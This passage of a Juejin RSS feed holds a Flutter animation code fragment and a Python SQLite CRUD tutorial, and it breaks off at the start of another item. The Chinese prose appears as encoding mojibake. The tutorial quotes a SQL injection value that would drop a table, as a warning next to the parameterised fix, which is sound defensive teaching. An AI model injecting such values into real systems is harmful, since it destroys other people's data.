  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> AnimatedBuilder(
      animation: _controller,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Transform.rotate(
          angle: _rotationAnimation.value,
          child: Transform.scale(
            scale: _scaleAnimation.value,
            child: Container(
              width: <span class="hljs-number">60</span>,
              height: <span class="hljs-number">60</span>,
              decoration: BoxDecoration(
                color: _colorAnimation.value,
                borderRadius: BorderRadius.circular(<span class="hljs-number">30</span>),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(<span class="hljs-number">0.2</span>),
                    blurRadius: <span class="hljs-number">10</span>,
                    offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>),
                  ),
                ],
              ),
              child: Icon(
                Icons.refresh,
                color: Colors.white,
                size: <span class="hljs-number">30</span>,
              ),
            ),
          ),
        );
      },
    );
  }
}
</code></pre>
<h2 data-id="heading-29">æ€»ç»“</h2>
<h3 data-id="heading-30">æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3>
<ul>
<li>ç†è§£äº†Animationã€AnimationControllerã€Tweenã€Curveçš„ä½œç”¨</li>
<li>æŒæ¡äº†åŠ¨ç”»çŠ¶æ€çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†</li>
<li>ç†è§£äº†éšå¼åŠ¨ç”»çš„è‡ªåŠ¨ç®¡ç†æœºåˆ¶</li>
<li>å­¦ä¼šäº†åˆ›å»ºå„ç§ç±»å‹çš„è¡¥é—´åŠ¨ç”»</li>
<li>å­¦ä¼šäº†ä½¿ç”¨Curvesè®©åŠ¨ç”»æ›´è‡ªç„¶</li>
<li>å­¦ä¼šäº†åˆ›å»ºå¤æ‚çš„è‡ªå®šä¹‰åŠ¨ç”»</li>
<li>å­¦ä¼šäº†ä½¿ç”¨AnimatedBuilderä¼˜åŒ–æ€§èƒ½</li>
</ul>
<p>ä¸€ä¸ªå¥½çš„åº”ç”¨æ•´ä½“åŠ¨ç”»æ•ˆæœé£æ ¼è¦ä¸€è‡´ï¼ŒåŒæ—¶è¦ä¿æŒæµç•…åº¦ï¼Œå¢å¼ºç”¨æˆ·ä½“éªŒã€‚é€šè¿‡æœ¬èŠ‚å­¦ä¹ ï¼Œç›¸ä¿¡å¤§å®¶å·²ç»æŒæ¡äº†FlutteråŠ¨ç”»çš„æ ¸å¿ƒæ¦‚å¿µå’Œå®æˆ˜æŠ€å·§ã€‚å¤šåŠ¨æ‰‹å®ç°å„ç§åŠ¨ç”»æ•ˆæœï¼Œä¸æ–­è°ƒè¯•ä¼˜åŒ–å§~~~ <strong>æœ‰ä»»ä½•é—®é¢˜æ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ï¼Œçœ‹åˆ°ä¼šç¬¬ä¸€æ—¶é—´å›å¤ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•åœ¨Pythonä¸­ä½¿ç”¨SQLiteæ•°æ®åº“è¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œï¼Ÿ]]></title>    <link>https://juejin.cn/post/7576026767371763731</link>    <guid>https://juejin.cn/post/7576026767371763731</guid>    <pubDate>2025-11-24T08:50:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767371763731" data-draft-id="7576018857367961643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•åœ¨Pythonä¸­ä½¿ç”¨SQLiteæ•°æ®åº“è¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œï¼Ÿ"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-24T08:50:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="testç®¡å®¶"/> <meta itemprop="url" content="https://juejin.cn/user/2763513988408746"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•åœ¨Pythonä¸­ä½¿ç”¨SQLiteæ•°æ®åº“è¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2763513988408746/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    testç®¡å®¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T08:50:04.000Z" title="Mon Nov 24 2025 08:50:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>SQLite æ˜¯ Python å†…ç½®æ”¯æŒçš„è½»é‡çº§åµŒå…¥å¼æ•°æ®åº“ï¼Œæ— éœ€å®‰è£…é¢å¤–æœåŠ¡ç«¯ï¼Œä»…é€šè¿‡æ–‡ä»¶ï¼ˆæˆ–å†…å­˜ï¼‰å­˜å‚¨æ•°æ®ï¼Œéå¸¸é€‚åˆå°å‹é¡¹ç›®ã€æµ‹è¯•åœºæ™¯æˆ–æœ¬åœ°æ•°æ®ç®¡ç†ã€‚ä»¥ä¸‹æ˜¯<strong>å®Œæ•´çš„å¢åˆ æ”¹æŸ¥ï¼ˆCRUDï¼‰æ“ä½œæ•™ç¨‹</strong>ï¼ŒåŒ…å«æ ¸å¿ƒè¯­æ³•ã€ç¤ºä¾‹ä»£ç å’Œæœ€ä½³å®è·µã€‚</p>
<h3 data-id="heading-0">ä¸€ã€æ ¸å¿ƒå‰ç½®çŸ¥è¯†</h3>
<ol>
<li>Python å†…ç½® <code>sqlite3</code> æ¨¡å—ï¼Œæ— éœ€ <code>pip install</code>ï¼Œç›´æ¥å¯¼å…¥å³å¯ä½¿ç”¨ã€‚</li>
<li>æ“ä½œæµç¨‹ï¼š<code>å»ºç«‹è¿æ¥ â†’ åˆ›å»ºæ¸¸æ ‡ â†’ æ‰§è¡ŒSQL â†’ å¤„ç†ç»“æœ â†’ æäº¤äº‹åŠ¡ï¼ˆå¢åˆ æ”¹ï¼‰â†’ å…³é—­èµ„æº</code>ã€‚</li>
<li>å ä½ç¬¦ï¼šSQLite ä½¿ç”¨ <code>?</code> ä½œä¸ºå‚æ•°å ä½ç¬¦ï¼ˆé¿å… SQL æ³¨å…¥ï¼Œåˆ‡å‹¿å­—ç¬¦ä¸²æ‹¼æ¥ï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-1">äºŒã€å®Œæ•´ CRUD ç¤ºä¾‹</h3>
<h4 data-id="heading-2">æ­¥éª¤1ï¼šå¯¼å…¥æ¨¡å—å¹¶å»ºç«‹è¿æ¥</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># 1. å»ºç«‹è¿æ¥ï¼ˆå…³é”®ï¼‰</span>
<span class="hljs-comment"># - è¿æ¥æœ¬åœ°æ–‡ä»¶ï¼štest.dbï¼ˆä¸å­˜åœ¨åˆ™è‡ªåŠ¨åˆ›å»ºï¼‰</span>
<span class="hljs-comment"># - å†…å­˜æ•°æ®åº“ï¼šsqlite3.connect(":memory:")ï¼ˆç¨‹åºé€€å‡ºåæ•°æ®ä¸¢å¤±ï¼‰</span>
conn = sqlite3.connect(<span class="hljs-string">"test.db"</span>)

<span class="hljs-comment"># 2. åˆ›å»ºæ¸¸æ ‡ï¼ˆæ‰§è¡ŒSQLçš„å·¥å…·ï¼‰</span>
cursor = conn.cursor()
</code></pre>
<h4 data-id="heading-3">æ­¥éª¤2ï¼šåˆ›å»ºè¡¨ï¼ˆåŸºç¡€å‡†å¤‡ï¼‰</h4>
<p>å…ˆå®šä¹‰æ•°æ®è¡¨ç»“æ„ï¼ˆä»¥ <code>users</code> è¡¨ä¸ºä¾‹ï¼ŒåŒ…å« idã€å§“åã€å¹´é¾„ã€é‚®ç®±ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºusersè¡¨ï¼ˆIF NOT EXISTS é¿å…é‡å¤åˆ›å»ºï¼‰</span>
create_table_sql = <span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,  -- è‡ªå¢ä¸»é”®
    name TEXT NOT NULL,                    -- å§“åï¼ˆéç©ºï¼‰
    age INTEGER,                           -- å¹´é¾„
    email TEXT UNIQUE                      -- é‚®ç®±ï¼ˆå”¯ä¸€ï¼Œé¿å…é‡å¤ï¼‰
);
"""</span>
cursor.execute(create_table_sql)
conn.commit()  <span class="hljs-comment"># å»ºè¡¨å±äºä¿®æ”¹æ“ä½œï¼Œéœ€æäº¤äº‹åŠ¡</span>
</code></pre>
<h4 data-id="heading-4">æ­¥éª¤3ï¼šæ–°å¢æ•°æ®ï¼ˆCREATEï¼‰</h4>
<p>æ”¯æŒ<strong>å•æ¡æ’å…¥</strong>å’Œ<strong>æ‰¹é‡æ’å…¥</strong>ï¼Œæ ¸å¿ƒæ˜¯ç”¨ <code>?</code> å ä½ç¬¦ä¼ é€’å‚æ•°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–¹å¼1ï¼šå•æ¡æ’å…¥</span>
insert_single_sql = <span class="hljs-string">"INSERT INTO users (name, age, email) VALUES (?, ?, ?);"</span>
<span class="hljs-comment"># å‚æ•°ä»¥å…ƒç»„å½¢å¼ä¼ é€’ï¼ŒåŒ¹é…å ä½ç¬¦æ•°é‡</span>
cursor.execute(insert_single_sql, (<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"alice@example.com"</span>))

<span class="hljs-comment"># æ–¹å¼2ï¼šæ‰¹é‡æ’å…¥ï¼ˆæ•ˆç‡æ›´é«˜ï¼Œå‡å°‘IOï¼‰</span>
insert_batch_sql = <span class="hljs-string">"INSERT INTO users (name, age, email) VALUES (?, ?, ?);"</span>
data_list = [
    (<span class="hljs-string">"Bob"</span>, <span class="hljs-number">30</span>, <span class="hljs-string">"bob@example.com"</span>),
    (<span class="hljs-string">"Charlie"</span>, <span class="hljs-number">28</span>, <span class="hljs-string">"charlie@example.com"</span>),
    (<span class="hljs-string">"David"</span>, <span class="hljs-number">22</span>, <span class="hljs-string">"david@example.com"</span>)
]
cursor.executemany(insert_batch_sql, data_list)

<span class="hljs-comment"># å¢åˆ æ”¹æ“ä½œå¿…é¡»æäº¤äº‹åŠ¡ï¼Œå¦åˆ™æ•°æ®ä¸ç”Ÿæ•ˆ</span>
conn.commit()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ’å…¥æ•°æ®æˆåŠŸï¼Œæœ€åæ’å…¥çš„IDï¼š"</span>, cursor.lastrowid)  <span class="hljs-comment"># è·å–æœ€åæ’å…¥çš„ä¸»é”®ID</span>
</code></pre>
<h4 data-id="heading-5">æ­¥éª¤4ï¼šæŸ¥è¯¢æ•°æ®ï¼ˆREADï¼‰</h4>
<p>æŸ¥è¯¢æ— éœ€æäº¤äº‹åŠ¡ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡ <code>fetchone()</code>/<code>fetchall()</code>/<code>fetchmany(n)</code> è·å–ç»“æœï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–¹å¼1ï¼šæŸ¥è¯¢å•æ¡æ•°æ®ï¼ˆfetchone()ï¼‰</span>
select_single_sql = <span class="hljs-string">"SELECT * FROM users WHERE name = ?;"</span>
cursor.execute(select_single_sql, (<span class="hljs-string">"Alice"</span>,))
single_result = cursor.fetchone()  <span class="hljs-comment"># è¿”å›å…ƒç»„ï¼š(1, 'Alice', 25, 'alice@example.com')</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å•æ¡æŸ¥è¯¢ç»“æœï¼š"</span>, single_result)

<span class="hljs-comment"># æ–¹å¼2ï¼šæŸ¥è¯¢å¤šæ¡æ•°æ®ï¼ˆfetchall()ï¼‰</span>
select_all_sql = <span class="hljs-string">"SELECT id, name, age FROM users WHERE age &gt; ?;"</span>
cursor.execute(select_all_sql, (<span class="hljs-number">25</span>,))
all_results = cursor.fetchall()  <span class="hljs-comment"># è¿”å›åˆ—è¡¨åµŒå¥—å…ƒç»„ï¼š[(2, 'Bob', 30), (3, 'Charlie', 28)]</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nå¤šæ¡æŸ¥è¯¢ç»“æœï¼š"</span>)
<span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> all_results:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ID: <span class="hljs-subst">{row[<span class="hljs-number">0</span>]}</span>, å§“å: <span class="hljs-subst">{row[<span class="hljs-number">1</span>]}</span>, å¹´é¾„: <span class="hljs-subst">{row[<span class="hljs-number">2</span>]}</span>"</span>)

<span class="hljs-comment"># æ–¹å¼3ï¼šæŒ‡å®šæ¡æ•°æŸ¥è¯¢ï¼ˆfetchmany(n)ï¼‰</span>
cursor.execute(<span class="hljs-string">"SELECT * FROM users;"</span>)
many_results = cursor.fetchmany(<span class="hljs-number">2</span>)  <span class="hljs-comment"># ä»…è·å–å‰2æ¡</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\næŒ‡å®šæ¡æ•°æŸ¥è¯¢ç»“æœï¼š"</span>, many_results)

<span class="hljs-comment"># è¿›é˜¶ï¼šè¿”å›å­—å…¸æ ¼å¼ç»“æœï¼ˆæ›´æ˜“è¯»ï¼‰</span>
<span class="hljs-comment"># åˆ›å»ºæ¸¸æ ‡æ—¶æŒ‡å®š row_factory</span>
conn.row_factory = sqlite3.Row
cursor = conn.cursor()
cursor.execute(<span class="hljs-string">"SELECT * FROM users WHERE id = ?;"</span>, (<span class="hljs-number">1</span>,))
dict_result = cursor.fetchone()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nå­—å…¸æ ¼å¼ç»“æœï¼š"</span>, dict_result[<span class="hljs-string">"name"</span>], dict_result[<span class="hljs-string">"email"</span>])  <span class="hljs-comment"># å¯é€šè¿‡é”®å–å€¼</span>
</code></pre>
<h4 data-id="heading-6">æ­¥éª¤5ï¼šæ›´æ–°æ•°æ®ï¼ˆUPDATEï¼‰</h4>
<p>æ ¹æ®æ¡ä»¶ä¿®æ”¹å·²æœ‰æ•°æ®ï¼Œæ³¨æ„åŠ  <code>WHERE</code> å­å¥ï¼ˆå¦åˆ™ä¼šæ›´æ–°å…¨è¡¨ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python">update_sql = <span class="hljs-string">"UPDATE users SET age = ? WHERE name = ?;"</span>
cursor.execute(update_sql, (<span class="hljs-number">26</span>, <span class="hljs-string">"Alice"</span>))  <span class="hljs-comment"># å°†Aliceçš„å¹´é¾„æ”¹ä¸º26</span>
conn.commit()

<span class="hljs-comment"># æŸ¥çœ‹å—å½±å“çš„è¡Œæ•°</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ›´æ–°å½±å“çš„è¡Œæ•°ï¼š"</span>, cursor.rowcount)  <span class="hljs-comment"># è¾“å‡ºï¼š1</span>
</code></pre>
<h4 data-id="heading-7">æ­¥éª¤6ï¼šåˆ é™¤æ•°æ®ï¼ˆDELETEï¼‰</h4>
<p>åŒæ ·éœ€åŠ  <code>WHERE</code> å­å¥ï¼ˆå¦åˆ™åˆ é™¤å…¨è¡¨æ•°æ®ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python">delete_sql = <span class="hljs-string">"DELETE FROM users WHERE id = ?;"</span>
cursor.execute(delete_sql, (<span class="hljs-number">4</span>,))  <span class="hljs-comment"># åˆ é™¤IDä¸º4çš„è®°å½•</span>
conn.commit()

<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤å½±å“çš„è¡Œæ•°ï¼š"</span>, cursor.rowcount)  <span class="hljs-comment"># è¾“å‡ºï¼š1</span>
</code></pre>
<h4 data-id="heading-8">æ­¥éª¤7ï¼šå…³é—­èµ„æºï¼ˆé¿å…æ³„æ¼ï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å…ˆå…³æ¸¸æ ‡ï¼Œå†å…³è¿æ¥</span>
cursor.close()
conn.close()
</code></pre>
<h3 data-id="heading-9">ä¸‰ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-10">1. ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆwith è¯­å¥ï¼‰</h4>
<p>è‡ªåŠ¨å…³é—­æ¸¸æ ‡/è¿æ¥ï¼Œæ— éœ€æ‰‹åŠ¨ <code>close</code>ï¼Œæ›´ç®€æ´å®‰å…¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-comment"># ä¸Šä¸‹æ–‡ç®¡ç†å™¨ç®€åŒ–æ“ä½œ</span>
<span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">"test.db"</span>) <span class="hljs-keyword">as</span> conn:
    cursor = conn.cursor()
    <span class="hljs-comment"># æ‰§è¡ŒæŸ¥è¯¢</span>
    cursor.execute(<span class="hljs-string">"SELECT * FROM users;"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¸Šä¸‹æ–‡ç®¡ç†å™¨æŸ¥è¯¢ç»“æœï¼š"</span>, cursor.fetchall())
    <span class="hljs-comment"># å¢åˆ æ”¹æ— éœ€æ‰‹åŠ¨commitï¼Œwithå—ç»“æŸä¼šè‡ªåŠ¨æäº¤ï¼ˆå‡ºé”™åˆ™å›æ»šï¼‰</span>
    cursor.execute(<span class="hljs-string">"INSERT INTO users (name, age, email) VALUES (?, ?, ?);"</span>, (<span class="hljs-string">"Eve"</span>, <span class="hljs-number">29</span>, <span class="hljs-string">"eve@example.com"</span>))
</code></pre>
<h4 data-id="heading-11">2. é˜² SQL æ³¨å…¥ï¼ˆå…³é”®ï¼‰</h4>
<p><strong>ä¸¥ç¦å­—ç¬¦ä¸²æ‹¼æ¥ SQL</strong>ï¼Œå¿…é¡»ä½¿ç”¨ <code>?</code> å ä½ç¬¦ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é”™è¯¯ç¤ºä¾‹ï¼ˆæ˜“è¢«æ³¨å…¥ï¼Œå¦‚nameä¼ å…¥ "Alice'; DROP TABLE users; --"ï¼‰</span>
name = <span class="hljs-string">"Alice"</span>
sql = <span class="hljs-string">f"SELECT * FROM users WHERE name = '<span class="hljs-subst">{name}</span>';"</span>  <span class="hljs-comment"># å±é™©ï¼</span>

<span class="hljs-comment"># æ­£ç¡®ç¤ºä¾‹ï¼ˆå ä½ç¬¦ï¼‰</span>
sql = <span class="hljs-string">"SELECT * FROM users WHERE name = ?;"</span>
cursor.execute(sql, (name,))  <span class="hljs-comment"># å®‰å…¨</span>
</code></pre>
<h4 data-id="heading-12">3. å¤„ç†å¼‚å¸¸ï¼ˆç”Ÿäº§ç¯å¢ƒå¿…å¤‡ï¼‰</h4>
<p>æ•è· <code>sqlite3.Error</code> å¼‚å¸¸ï¼Œé¿å…ç¨‹åºå´©æºƒï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-keyword">try</span>:
    conn = sqlite3.connect(<span class="hljs-string">"test.db"</span>)
    cursor = conn.cursor()
    <span class="hljs-comment"># æ‰§è¡Œå¯èƒ½å‡ºé”™çš„æ“ä½œï¼ˆå¦‚æ’å…¥é‡å¤é‚®ç®±ï¼‰</span>
    cursor.execute(<span class="hljs-string">"INSERT INTO users (name, age, email) VALUES (?, ?, ?);"</span>, (<span class="hljs-string">"Frank"</span>, <span class="hljs-number">35</span>, <span class="hljs-string">"alice@example.com"</span>))
    conn.commit()
<span class="hljs-keyword">except</span> sqlite3.IntegrityError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ•è·å”¯ä¸€é”®å†²çªå¼‚å¸¸</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ’å…¥å¤±è´¥ï¼šå”¯ä¸€é”®å†²çª"</span>, e)
    conn.rollback()  <span class="hljs-comment"># å‡ºé”™å›æ»šäº‹åŠ¡</span>
<span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ•°æ®åº“é”™è¯¯ï¼š"</span>, e)
    conn.rollback()
<span class="hljs-keyword">finally</span>:
    <span class="hljs-keyword">if</span> cursor:
        cursor.close()
    <span class="hljs-keyword">if</span> conn:
        conn.close()
</code></pre>
<h3 data-id="heading-13">å››ã€å¸¸è§é—®é¢˜è§£ç­”</h3>
<ol>
<li><strong>å»ºè¡¨åæ•°æ®ä¸ç”Ÿæ•ˆï¼Ÿ</strong><br/>
å¢åˆ æ”¹/å»ºè¡¨æ“ä½œéœ€æ‰§è¡Œ <code>conn.commit()</code>ï¼ŒæŸ¥è¯¢æ— éœ€ã€‚</li>
<li><strong>è‡ªå¢ä¸»é”®å¦‚ä½•è·å–ï¼Ÿ</strong><br/>
æ’å…¥åé€šè¿‡ <code>cursor.lastrowid</code> è·å–æœ€åæ’å…¥çš„ IDã€‚</li>
<li><strong>å¦‚ä½•è¿”å›å­—å…¸æ ¼å¼ç»“æœï¼Ÿ</strong><br/>
è®¾ç½® <code>conn.row_factory = sqlite3.Row</code>ï¼Œæ¸¸æ ‡ç»“æœå¯é€šè¿‡é”®å–å€¼ã€‚</li>
<li><strong>å†…å­˜æ•°æ®åº“çš„ç”¨é€”ï¼Ÿ</strong><br/>
<code>sqlite3.connect(":memory:")</code> é€‚åˆä¸´æ—¶æµ‹è¯•ï¼Œæ•°æ®ä»…å­˜äºå†…å­˜ï¼Œç¨‹åºé€€å‡ºåä¸¢å¤±ã€‚</li>
</ol>
<h3 data-id="heading-14">æ€»ç»“</h3>
<p>SQLite æ“ä½œçš„æ ¸å¿ƒæ˜¯ï¼š</p>
<ul>
<li>è¿æ¥ï¼š<code>sqlite3.connect()</code>ï¼ˆæ–‡ä»¶/å†…å­˜ï¼‰ï¼›</li>
<li>æ‰§è¡Œï¼š<code>cursor.execute()</code>ï¼ˆå•æ¡ï¼‰/<code>executemany()</code>ï¼ˆæ‰¹é‡ï¼‰ï¼›</li>
<li>å‚æ•°ï¼šç”¨ <code>?</code> å ä½ç¬¦ï¼Œé¿å… SQL æ³¨å…¥ï¼›</li>
<li>äº‹åŠ¡ï¼šå¢åˆ æ”¹éœ€ <code>commit()</code>ï¼Œå¼‚å¸¸éœ€ <code>rollback()</code>ï¼›</li>
<li>èµ„æºï¼šç”¨ <code>with</code> è¯­å¥æˆ–æ‰‹åŠ¨å…³é—­æ¸¸æ ‡/è¿æ¥ã€‚</li>
</ul>
<p>æŒæ¡ä»¥ä¸Šå†…å®¹ï¼Œå³å¯æ»¡è¶³ Python ä¸­ SQLite ç»å¤§éƒ¨åˆ†åŸºç¡€ä½¿ç”¨åœºæ™¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gemini3Proæ— é™ä½¿ç”¨æ‰‹æŠŠæ‰‹æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7575829296452911114</link>    <guid>https://juejin.cn/post/7575829296452911114</guid>    <pubDate>2025-11-24T09:08:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575829296452911114" data-draft-id="7576052677051039770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 